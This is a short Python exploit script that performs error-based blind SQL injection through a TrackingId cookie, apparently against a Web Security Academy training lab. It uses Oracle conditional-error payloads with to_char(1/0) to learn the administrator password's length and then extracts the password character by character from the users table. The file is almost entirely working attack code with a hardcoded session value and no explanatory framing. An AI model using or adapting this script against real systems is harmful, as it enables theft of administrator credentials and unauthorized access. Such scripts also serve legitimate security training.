import requests

password_size = 0
password_chars = "abcdefghijklmnoprqstuvwxyz0123456789"

def send_request(payload):

    host = "https://0a88000c0413dc1ac161ae3000f40021.web-security-academy.net"
    cookies = {"TrackingId":"1xN8IYXy2AHF8isj" + payload + 
                "; session=yG0jCcomINX4aiBtqXPR0kvN69pGvjO3"}
    response = requests.get(host, cookies=cookies)
    return response

def password_length():

    for i in range (1,30):
        payload = ("' union select case when (username='administrator'"
                    " and (length(password))={}) then to_char(1/0) else"
                    " null end from users-- -".format(i))
        response = send_request(payload)
        if (response.status_code==500):
            print ("Password length is {} characters".format(i))
            global password_size
            password_size = i
            return True

def find_password(password_size):
    print ("Retriving password")
    for i in range(1,password_size+1):
        for j in range(0,len(password_chars)):
            payload = ("' union select case when (username='administrator'"
                        " and (substr(password,{},1))='{}') then to_char(1/0)"
                        " else null end from users-- -"
                        .format(i,password_chars[j]))
            response = send_request(payload)
            if (response.status_code==500):
                print(password_chars[j], sep='', end='', flush=True)
                break
    print("\nDone!")


if __name__ == "__main__":    
    if (password_length()):
        find_password(password_size)
        